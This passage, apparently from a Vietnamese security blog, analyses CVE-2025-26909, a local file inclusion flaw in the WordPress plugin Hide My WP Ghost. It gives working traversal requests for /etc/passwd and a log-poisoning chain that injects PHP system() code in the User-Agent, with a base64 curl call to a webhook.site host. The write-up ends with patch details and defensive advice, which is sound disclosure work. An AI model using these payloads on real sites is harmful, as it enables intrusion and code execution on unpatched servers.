</span></span><span class="line hl"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">maybeShowLogin</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getCurrentURL</span><span class="p">()</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line hl"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>showFile()</code> được <code>maybeShowNotFound</code> nếu client request đến tài nguyên không tồn tại với tham số là kết quả trả về của <code>getCurrentURL()</code>.</p>
<div class="highlight" filename="Files.php v5.3.02"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="hl"><span class="lnt"> 8
</span></span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getCurrentURL</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// build the URL in the address bar
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$url</span> <span class="o">=</span> <span class="nx">is_ssl</span><span class="p">()</span> <span class="o">?</span> <span class="s1">&#39;https://&#39;</span> <span class="o">:</span> <span class="s1">&#39;http://&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$url</span> <span class="o">.=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">];</span>
</span></span><span class="line hl"><span class="cl">        <span class="nv">$url</span> <span class="o">.=</span> <span class="nx">rawurldecode</span><span class="p">(</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>URI</code> lấy từ <code>$_SERVER['REQUEST_URI']</code> được decode rồi concat vào <code>$url</code> để trả về.</p>
<p>Ta đặt debug trong hàm <code>showFile()</code> và gửi request đến tài nguyên không tồn tại.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/x/wp-activate.php?</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Debugger đã nhảy đến <code>showFile()</code></p>
<figure><img src="/posts/2025-10-18-cve-2025-26909/debug1.png"
    alt="Debugger nhảy đến showFile()"><figcaption>
      <p>Debugger nhảy đến <code>showFile()</code></p>
    </figcaption>
</figure>

<h2 class="heading-element" id="exploit"><span>Exploit</span>
  <a href="#exploit" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Gửi request với LFI payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd?</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">none</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
</span></span><span class="line"><span class="cl"><span class="n">X-PwnFox-Color</span><span class="o">:</span> <span class="l">blue</span>
</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="o">:</span> <span class="l">u=0, i</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">0</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Debug</strong>:
<figure><img src="/posts/2025-10-18-cve-2025-26909/debug2.png"
    alt="Debugger với valid payload"><figcaption>
      <p>Debugger với valid payload</p>
    </figcaption>
</figure>
</p>
<p><strong>Result</strong>:</p>
<figure><img src="/posts/2025-10-18-cve-2025-26909/result1.png"
    alt="Kết quả LFI thành công"><figcaption>
      <p>Kết quả LFI thành công</p>
    </figcaption>
</figure>

<p><strong>Giải thích</strong>:</p>
<p><code>/x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd?</code> sau khi decode sẽ trở thành <code>/x/wp-activate.php/..///..///..///..///../etc/passwd?</code></p>
<p>Ta dùng chuỗi này để đánh lừa Apache, khiến Apache không phát hiện việc vượt <strong>Document Root</strong>. Nếu dùng <code>/x/wp-activate.php/../../../../../etc/passwd?</code> sẽ bị phát hiện vượt <strong>Document Root</strong>.</p>
<p><code>///</code> vẫn được chấp nhận tương đương <code>/</code>, ví dụ:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">w41bu1@22NS088:~$ ls /////////
</span></span><span class="line"><span class="cl">bin  boot  cdrom  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  swap.img</span></span></code></pre></td></tr></table>
</div>
</div><h3 class="heading-element" id="log-poisoning--lfi--rce"><span>Log poisoning → LFI → RCE</span>
  <a href="#log-poisoning--lfi--rce" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 class="heading-element" id="step-1"><span>Step 1</span>
  <a href="#step-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>Gửi request với PHP code đặt trong <code>User-Agent</code> header</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="hl"><span class="lnt"> 3
</span></span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line hl"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu;&lt;?php system(base64_decode(&#39;Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==&#39;)); ?&gt; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">none</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
</span></span><span class="line"><span class="cl"><span class="n">X-PwnFox-Color</span><span class="o">:</span> <span class="l">blue</span>
</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="o">:</span> <span class="l">u=0, i</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">0</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 class="heading-element" id="step-2"><span>Step 2</span>
  <a href="#step-2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>Gửi request với LFI payload trỏ đến <code>/var/log/apache2/other_vhosts_access.log</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log?</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">none</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
</span></span><span class="line"><span class="cl"><span class="n">X-PwnFox-Color</span><span class="o">:</span> <span class="l">blue</span>
</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="o">:</span> <span class="l">u=0, i</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">0</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Result</strong>:</p>
<figure><img src="/posts/2025-10-18-cve-2025-26909/result2.png"
    alt="Kết quả LFI =&gt; RCE thành công"><figcaption>
      <p>Kết quả LFI =&gt; RCE thành công</p>
    </figcaption>
</figure>

<p><strong>Giải thích</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-phtml" data-lang="phtml"><span class="line"><span class="cl"><span class="cp">&lt;?php</span> <span class="nx">system</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==&#39;</span><span class="p">));</span> <span class="cp">?&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Khi truy cập trang với User‑Agent chứa payload trên, Apache sẽ lưu payload này vào access log:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log
</span></span><span class="line"><span class="cl">127.0.1.1:80 127.0.0.1 - - <span class="o">[</span>18/Oct/2025:19:10:08 +0700<span class="o">]</span> <span class="s2">&#34;GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1&#34;</span> <span class="m">403</span> <span class="m">2844</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (X11; Ubuntu; &lt;?php system(base64_decode(&#39;Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==&#39;)); ?&gt;Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#34;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Khi <code>include()</code> một file, PHP sẽ thực thi mọi mã PHP (<code>&lt;?php ?&gt;</code>) có trong nội dung file trước khi trả về. Payload được mã hoá bằng Base64 và giải mã tại thời điểm include bằng <code>base64_decode</code> tránh lỗi escape dấu ngoặc kép (<code>&quot;</code> → <code>\&quot;</code>) khi logger lưu. Lệnh giải mã sẽ trở thành:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -I <span class="s1">&#39;https://webhook.site/bac7e163-b475-4323-a315-acd010359640&#39;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Cuối cùng <code>system()</code> sẽ chạy lệnh này và trả output.</p>
<div class="alert alert-warning"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z"/></svg>Cảnh báo</p><p>Lưu ý: dù <code>base64_decode</code> bị chặn bởi plugin nhưng Apache đã lưu trữ trước khi plugin xử lý, chuỗi Base64 vẫn được ghi vào log.</p></div><h3 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Phiên bản <strong>≤ 5.4.01</strong> của Hide My WP Ghost cho phép LFI vì plugin tái tạo đường dẫn rồi <code>include()</code> mà không canonicalize/whitelist. Bằng cách kết hợp log‑poisoning và payload chứa <code>/wp-activate.php/?</code>, kẻ tấn công có thể từ LFI leo thành RCE trong một số cấu hình. Lỗ hổng được vá trong <strong>5.4.02</strong> bằng việc sanitize URL trước khi trả về.</p>
<h3 class="heading-element" id="key-takeaways"><span>Key takeaways</span>
  <a href="#key-takeaways" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li><strong>Không include trực tiếp</strong> dữ liệu từ request.</li>
<li>Dùng <strong>realpath() / basename() / whitelist / kiểm tra base_dir</strong> trước khi include.</li>
<li><code>sanitize_text_field()</code> không đủ để ngăn traversal.</li>
<li>Log poisoning (User‑Agent, Referer…) có thể tạo nguồn payload cho LFI — không ghi thô nội dung có thể được include sau này.</li>
<li>Vá phải kết hợp: sanitize + canonicalize + giới hạn thư mục + kiểm soát quyền ghi log.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols"target="_blank" rel="external nofollow noopener noreferrer">File Inclusion/Path traversal — Hacktrick</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/hide-my-wp/vulnerability/wordpress-hide-my-wp-ghost-plugin-5-4-01-local-file-inclusion-to-rce-vulnerability"target="_blank" rel="external nofollow noopener noreferrer"> WordPress Hide My WP Ghost Plugin &lt;= 5.4.01 is vulnerable to Local File Inclusion </a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Nội dung liên quan</h2>
    <ul><li>
          <a href="/vi/posts/2025-10-20-cve-2025-52716/" title="CVE-2025-52716 Analysis &amp; POC">CVE-2025-52716 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-19-cve-2025-6715/" title="CVE-2025-6715 Analysis &amp; POC">CVE-2025-6715 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-17-cve-2025-39399/" title="CVE-2025-39399 Analysis &amp; POC">CVE-2025-39399 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-16-cve-2025-30782/" title="CVE-2025-30782 Analysis &amp; POC">CVE-2025-30782 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-15-cve-2025-30868/" title="CVE-2025-30868 Analysis &amp; POC">CVE-2025-30868 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-21-cve-2025-32141/" title="CVE-2025-32141 Analysis &amp; POC">CVE-2025-32141 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-14-cve-2025-32654/" title="CVE-2025-32654 Analysis &amp; POC">CVE-2025-32654 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-13-cve-2025-48293/" title="CVE-2025-48293 Analysis &amp; POC">CVE-2025-48293 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-12-cve-2025-53328/" title="CVE-2025-53328 Analysis &amp; POC">CVE-2025-53328 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-10-29-cve-2025-12136/" title="CVE-2025-12136 Analysis &amp; POC">CVE-2025-12136 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
